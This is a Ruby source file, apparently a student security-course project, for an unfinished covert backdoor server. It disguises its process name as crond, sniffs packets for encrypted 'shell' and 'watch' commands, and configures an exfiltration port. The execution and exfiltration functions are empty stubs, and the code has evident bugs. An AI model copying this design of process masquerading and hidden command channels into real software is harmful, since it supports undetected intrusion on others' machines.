#!/usr/bin/env ruby
=begin
-------------------------------------------------------------------------------------
-- SOURCE FILE:   server.rb - description goes here
--
-- PROGRAM:       server
--                ./server.rb
--
-- FUNCTIONS:     stuff here
--
-- Ruby Gems req: 
-- 
-- DATE:          May/June 2014
--
-- REVISIONS:     See development repo: https://github.com/deuterium/comp8505-final
--
-- DESIGNERS:     Chris Wood - chriswood.ca@gmail.com
--
-- PROGRAMMERS:   Chris Wood - chriswood.ca@gmail.com
-- 
-- NOTES:         weird buffer for capture, client needs to send 2 commmands
--                before server receives both at the same time
---------------------------------------------------------------------------------------
=end

require 'packetfu'
require 'openssl'
require_relative 'util.rb'

# rename process immediately
$0 = "/usr/sbin/crond -n"

## Variables

## Application Strings
CONFIG_FILE = "not_important"
CONFIG_FILE_DEFAULT = "\# This is an important system file! Please do not edit\n"
CONFIG_FILE_DEFAULT << "\# pen_prot = tcp\n"
CONFIG_FILE_DEFAULT << "\# pen_port = 6886\n"
CONFIG_FILE_DEFAULT << "\# exfil_prot = tcp\n"
CONFIG_FILE_DEFAULT << "\# exfil_port = 8668\n"
CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
CONFIG_INVALID = "Error parsing configuration. #{CONFIG_EDIT}"

## Functions

def validate_config
  file = ""
  File.open(CONFIG_FILE, "r") { |f| file = f.readlines }
  file.each do |l|
    l.strip!
    if l[0] == '#' #line is comment
      next
    elsif l.include? '='
      pair = l.split('=')
      begin
        pair[0].strip!
        pair[1].strip!
      rescue #if strip fails, pair is blank, bad config
        exit_reason(CONFIG_INVALID)
      end

      case pair[0]
      when "pen_prot"
        if valid_protocol(pair[1])
          @cfg_pen_protocol = pair[1]
        end
      when "pen_port"
        if valid_port(pair[1].to_i)
          @cfg_pen_port = pair[1].to_i
        end
      when "exfil_prot"
        if valid_protocol(pair[1])
          @cfg_exfil_protocol = pair[1]
        end
      when "exfil_port"
        if valid_port(pair[1].to_i)
          @cfg_exfil_port = pair[1].to_i
        end
      when "interface"
        #interface validation?
        @cfg_iface = pair[1]
      end
    end
  end
  #check if all items are present
  if @cfg_pen_protocol == nil || @cfg_exfil_protocol == nil \
    || @cfg_iface == nil || @cfg_pen_port == nil \
    || @cfg_exfil_port == nil
    exit_reason(CONFIG_INVALID)
  end
end

def start_listen_server
  puts "server listening"
  filter = "#{@cfg_pen_protocol} and dst port #{@cfg_pen_port}"
  begin
    cap = PacketFu::Capture.new(:iface => @cfg_iface,
      :start => true,
      :promic => true,
      :filter => filter)
    cap.stream.each do |p|
      pkt =  PacketFu::Packet.parse(p)
      if @cfg_pen_protocol == TCP
        puts "in TCP mode" #DEBUG
        #check for auth
        #if auth'd parse payload for command
        #do command
      elsif @cfg_pen_protocol == UDP
        puts "in UDP mode" #DEBUG
        payload = decrypt(pkt.payload)
        cmds = payload.split(' ')
        if cmds[0] = AUTH_STRING
          case cmds[1]
          when MODE_SHELL
            cmd = cmds[2..-1].join(' ')
            puts cmd
            #execute cmd here
            #get resp
            #start other junk for knock and send back
          when MODE_WATCH
            puts "WATCH command received" #DEBUG
          end
        else
          next #not auth, skip
        end
      end
          
      #look at packets here
      #check for auth
      #commands

    end
  rescue Exception => e
    puts "error in packet capture"
    puts e.trace

    #if bad error raise exception to kill program
  end
end

def parse_payload(payload)

end

def execute_shell_command(command)

end

def start_watch(type, name)
  #type is file or folder
  
end

def send_file(file, destination)
  
end

def generate_knock_seq
  
end

## Main

# check for root
raise 'Must run as root' unless Process.uid == 0
load_config_file
begin
  listen_thread = Thread.new { start_listen_server }
  listen_thread.join
rescue Interrupt # Catch the interrupt(ctrl c) and kill the thread
  Thread.kill(listen_thread)
  exit 0
end
